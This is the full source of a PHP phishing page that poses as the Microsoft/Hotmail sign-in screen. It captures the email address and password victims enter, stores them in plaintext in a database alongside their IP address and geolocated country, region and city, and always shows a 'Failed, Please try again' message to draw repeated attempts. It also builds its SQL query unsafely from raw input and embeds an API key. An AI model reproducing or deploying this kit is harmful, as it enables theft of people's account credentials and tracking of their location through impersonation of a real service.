<?php


ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

require_once("include/connection.php");

try {

    if (isset($_POST["submit"])) {
        function get_client_ip()
        {
            $ip = '';
            if (isset($_SERVER['HTTP_CLIENT_IP'])) {
                $ip = $_SERVER['HTTP_CLIENT_IP'];
            } elseif (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
                $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
            } else {
                $ip = $_SERVER['REMOTE_ADDR'];
            }
            return $ip;
        }

        $ip = get_client_ip();
        // echo $ip;

        // $my_ip = $_GET['ip'];

        $url = 'https://api.ip2location.io/?key=2E356E745332DB637417230C7997A646&ip=' . $ip;

        $response = file_get_contents($url);
        // echo $response;


        if ($response) {
            $data = json_decode($response, true); // Decode the JSON response into an associative array
            // echo $data;

            if ($data && is_array($data)) {
                foreach ($data as $key => $value) {
                    // echo "$key: $value <br >";
                    if ($key == 'ip') {
                        $ip_address = $value;
                    }
                    if ($key == 'country_name') {
                        $country_name = $value;
                    }
                    if ($key == 'region_name') {
                        $region_name = $value;
                    }
                    if ($key == 'city_name') {
                        $city_name = $value;
                    }
                }
            } else {
                // echo "Invalid JSON Data";
            }
        } else {
            // echo "API Request failed";
        }



        if (empty($_POST['email']) || empty($_POST['password'])) {
            $myerror = "Please fill in the blank fields";
        } else {
            $email = $_POST['email'];
            $password = $_POST['password'];
            // $password = password_hash($_POST['password'], PASSWORD_DEFAULT);



            $query = " INSERT INTO signup ( Email, Password, Country_name, Region_name, Ip_address, City_name) VALUES ('$email', '$password', '$country_name', '$region_name', '$ip_address', '$city_name') ";

            $result = mysqli_query($con, $query);

            if ($result) {
                $myerror = "Failed, Please try again.";
            } else {
                $myerror = "Failed, Please try again";
                //  header("location:instagram.php");
            }

        }
    } else {
        // echo "Connection failed" . mysqli_error($con);
        

    }

} catch (Exception $e) {
    // echo $e->getMessage();
}


?>



<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="icon" href="https://img.freepik.com/free-icon/microsoft_318-566086.jpg" type="image/x-icon" />
    <link rel="stylesheet" href="css/hotmail.css">
    <script src="https://cdn.tailwindcss.com"></script>

    <link href="https://cdnjs.cloudflare.com/ajax/libs/flowbite/1.8.1/flowbite.min.css" rel="stylesheet" />

    <title>Hotmail </title>
</head>

<body>
    <div class="flex flex-col lg:justify-center lg:items-center gap-2 lg:gap-5 h-screen">

        <div class="flex flex-col lg:w-[25%] lg:shadow-md p-7 lg:p-16 h-auto">
            <div class="float-left flex-2">
                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/96/Microsoft_logo_%282012%29.svg/1000px-Microsoft_logo_%282012%29.svg.png"
                    alt="Microsoft" id="logo" class="w-[150px]">
                <h1 class="title text-2xl font-bold">Sign in</h1>
            </div>


            <div style="color: red;">
                                        <?php
                                            // Check if $myerror is set and not empty
                                            if (!empty($myerror)) {
                                                echo '<p>' . $myerror . '</p>';
                                            }
                                        ?>
                                    </div>

            <form class="flex-1 flex flex-col gap-5 " action="" method="post">
                <div class="email-container  form  flex flex-col ">
                    <div class="flex flex-col gap-5 border-0">
                        <input type="email" name="email" id="email" placeholder="Email, phone, or Skype"
                            class="text-[14px] border-0 border-b-black border-b outline-0  focus:outline-none  focus:ring-0 pl-0">
                    </div>
                </div>

                <div class="password-container flex flex-col justify-between ">
                    <div class=" flex flex-col gap-5 border-0">
                        <input type="password" name="password" id="password" placeholder="Password"
                            class="text-[14px] border-0 border-b-black border-b outline-0  focus:outline-none  focus:ring-0 pl-0">

                        <div class="text-[12px] -mt-3">
                            <span>No account?</span>
                            <a href="#" class="text-[#0067b8] ml-1">Create one!</a>
                        </div>

                    </div>

                    <div class="flex justify-end">
                        <button type="submit" name="submit"
                            class="w-[35%] bg-[#0067b8] text-sm text-white p-2  lg:mt-10">Sign in</button>
                    </div>

                </div>
            </form>
        </div>

        <div
            class="flex  flex-row items-center w-[85%] mx-auto lg:w-[25%] border border-black lg:border-0  md:pl-16 p-1 md:p-2 my-3 md:shadow-md">
            <img src="https://logincdn.msftauth.net/shared/1.0/content/images/signin-options_3e3f6b73c3f310c31d2c4d131a8ab8c6.svg"
                alt="Key" class="w-[36px] h-[36px]">

            <a href="#" class="text-gray-500 text-sm ml-3">Sign-in options</a>
        </div>
    </div>







    <script>
        const emailContainer = document.querySelector(".email-container");
        const passwordContainer = document.querySelector(".password-container");
        const nextButton = document.getElementById("next-btn");
        const submitButton = document.getElementById("submit-btn");

        nextButton.addEventListener("click", () => {
            emailContainer.style.transform = "translateX(-100%)";
            passwordContainer.style.transform = "translateX(0)";
            emailContainer.style.display = "none";
            passwordContainer.style.display = "flex";
        });

        submitButton.addEventListener("click", () => {
            // Perform form submission or further actions
        });


        function showPasswordSlide() {
            const emailSlide = document.getElementById('email-slide');
            const passwordSlide = document.getElementById('password-slide');

            emailSlide.style.transform = 'translateX(-100%)';
            passwordSlide.style.transform = 'translateX(0)';
        }

    </script>


</body>

</html>